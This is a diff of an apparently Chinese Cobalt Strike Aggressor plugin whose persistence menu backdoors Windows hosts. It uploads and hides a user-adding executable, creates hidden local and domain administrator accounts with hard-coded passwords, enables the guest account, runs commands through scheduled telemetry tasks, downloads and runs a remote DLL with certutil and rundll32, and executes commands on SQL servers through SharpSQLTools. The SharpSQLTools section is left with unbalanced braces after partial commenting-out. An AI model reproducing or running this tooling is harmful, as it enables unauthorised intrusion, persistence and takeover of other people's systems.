@@ -65,7 +65,7 @@ menu "权限维持" {
 
 			        separator();
 			 menu "UserCollect" {
-			 item "单机环境添加用户" {
+			 item "单机环境添加用户(c/c++)" {#参考 https://www.cnblogs.com/17bdw/p/6790197.html
 
 				bupload($1["@"],script_resource("./modules/Persistence/Useradd.exe"));
 				bshell($1["@"],"attrib Useradd.exe +s +h");
@@ -75,7 +75,7 @@ menu "权限维持" {
 				bshell($1["@"],"del Useradd.exe");
 				blog($1["@"],"User:Saber pass:password@123");
 			}
-			menu "单机环境添加用户(MyCsharp)" {
+			menu "单机环境添加用户(Csharp)" {#Csharp适用于内存加载,文件不落地,参考:https://docs.microsoft.com/zh-cn/troubleshoot/dotnet/csharp/add-user-local-system 
 
 			sub CsharpAddUser{
     		$Name = $3['Username'];
@@ -111,7 +111,7 @@ menu "权限维持" {
 
 			}
 
-		item "激活guest用户" {
+		item "激活guest用户(cmd)" {
 		
 		if(-isadmin $1["@"])
 			{
@@ -126,7 +126,7 @@ menu "权限维持" {
   }
 
 
-  item "创建管理员用户" {
+  item "创建管理员用户(cmd)" {
     $bid = $1['@'];
     $Dialog = dialog("添加本地管理员用户",%(username => "zjun$", passwd => "admin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
     dialog_description($Dialog, "添加本地管理员用户，注意账户策略中的密码复杂度。");
@@ -145,7 +145,7 @@ menu "权限维持" {
   }
 
 
-  item "添加域管用户"{
+  item "添加域管用户(cmd)"{
     $bid = $1['@'];
     $Dialog = dialog("添加域管",%(username => "zjun$",passswd => "admin@123.",bid => $bid),&add_domainuser);
     dialog_description($Dialog, "添加域管理员用户，注意账户策略中的密码复杂度。");
@@ -162,7 +162,7 @@ menu "权限维持" {
   }
 
 
-  menu "add-admin(bypass)"{
+  menu "add-admin(c/c++)"{
     item "上传add-admin"{
       local('$bid');
       foreach $bid ($1){
@@ -178,6 +178,7 @@ menu "权限维持" {
       dialog_show($dialog);
     }
     sub add_admin{
+		blog($bid,"帐号：hacker 密码：P@ssw0rd")
       bshell($bid, "add-admin.exe");
       bshell($bid, "del /f /s /q add-admin.exe");
     }
@@ -192,7 +193,7 @@ menu "权限维持" {
 	}
 
  menu "\"遥测\"计划任务" {
-					item "无文件执行命令" {
+			item "无文件执行命令" {
 			$bid = $1['@'];
 			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
 			dialog_description($dialog, "输入cmd命令，cmd /s 后面的内容，执行方式：Telemetry.exe install /command:calc");
@@ -257,30 +258,30 @@ sub stage_attack {
 	elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");
 
 }
-				item "SharpSQLTools" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
-			dialog_description($dialog, "命令行版SQLTools");
-			drow_text($dialog, "host", "host:  ");	
-			drow_text($dialog, "username", "username:  ");	
-			drow_text($dialog, "password", "password:  ");			
-			drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
-			drow_combobox($dialog, "enable", "enable", @("None", "enable"));
-			drow_text($dialog, "cmd", "cmd:  ");
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-        }
-sub SharpSQLTools {
-	if($3['enable'] =~ "enable"){
-		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],$3['enable']));
-		bexecute_assembly($bid, script_resource("/modules/Persistence/SharpSQLTools.exe"), $arg);
-		}
-	else
-	{
+			#item "SharpSQLTools" {
+			#$bid = $1['@'];
+			#$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
+			#dialog_description($dialog, "命令行版SQLTools");
+			#drow_text($dialog, "host", "host:  ");	
+			#drow_text($dialog, "username", "username:  ");	
+			#drow_text($dialog, "password", "password:  ");			
+			#drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
+			#drow_combobox($dialog, "enable", "enable", @("None", "enable"));
+			#drow_text($dialog, "cmd", "cmd:  ");
+            #dbutton_action($dialog, "运行");
+			#dialog_show($dialog);
+        #}
+#sub SharpSQLTools {
+	#if($3['enable'] =~ "enable"){
+	#	$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],$3['enable']));
+		#bexecute_assembly($bid, script_resource("/modules/Persistence/SharpSQLTools.exe"), $arg);
+	#	}
+	#else
+	#{
 		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type'],"-c","$3['cmd']"));
 		bexecute_assembly($bid, script_resource("/modules/Persistence/SharpSQLTools.exe"), $arg);
-		}
-}		
+	#	}
+#}		
 		
 
 
